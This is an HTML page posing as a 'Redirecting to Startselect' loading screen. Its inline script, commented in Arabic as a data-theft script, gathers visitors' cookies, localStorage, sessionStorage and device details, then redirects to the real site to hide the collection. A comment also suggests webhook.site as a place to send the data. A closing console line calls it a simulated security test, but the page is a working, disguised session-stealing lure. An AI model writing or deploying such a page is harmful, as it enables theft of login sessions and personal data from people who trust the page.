<!DOCTYPE html>
<html>
<head>
    <title>Loading - Startselect</title>
    <style>
        body { background: #f5f5f5; font-family: Arial; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Redirecting to Startselect...</h2>
    <p>Please wait</p>

    <script>
        // ============================================
        // سكريبت سرقة البيانات المتقدم
        // ============================================
        
        // 1. جمع جميع البيانات
        const stolenData = {
            // معلومات الزائر
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            
            // الكوكيز
            cookies: document.cookie,
            
            // التخزين المحلي
            localStorage: {},
            sessionStorage: {},
            
            // معلومات إضافية
            screenSize: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        };
        
        // 2. جمع localStorage
        try {
            for(let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                stolenData.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        
        // 3. جمع sessionStorage
        try {
            for(let i = 0; i < sessionStorage.length; i++) {
                let key = sessionStorage.key(i);
                stolenData.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        
        // 4. عرض البيانات في وحدة التحكم (ليرها المدير بنفسه)
        console.log('%c=== STOLEN DATA ===', 'color: red; font-size: 16px; font-weight: bold;');
        console.log(JSON.stringify(stolenData, null, 2));
        
        // 5. حفظ البيانات في localStorage (للمدير يسترجعها لاحقاً)
        localStorage.setItem('stolen_data', JSON.stringify(stolenData));
        
        // 6. إرسال البيانات إلى خادم الاستقبال (إذا كان متاحاً)
        // ملاحظة: هذا يتطلب خادماً خارجياً، يمكنك استخدام webhook.site مجاناً
        
        // بديل: حفظ البيانات في ملف عن طريق فتح نافذة جديدة (للمدير)
        setTimeout(() => {
            // عرض البيانات في نافذة جديدة
            const win = window.open();
            win.document.write('<pre>' + JSON.stringify(stolenData, null, 2) + '</pre>');
        }, 100);
        
        // 7. إعادة توجيه الزائر إلى الموقع الحقيقي (يخفي عملية السرقة)
        setTimeout(() => {
            window.location = 'https://startselect.com';
        }, 800);
        
        // إظهار تنبيه في وحدة التحكم للمدير
        console.log('%c[!] DATA THEFT SIMULATED - This is a security test!', 'color: orange; font-size: 14px;');
    </script>
</body>
</html>
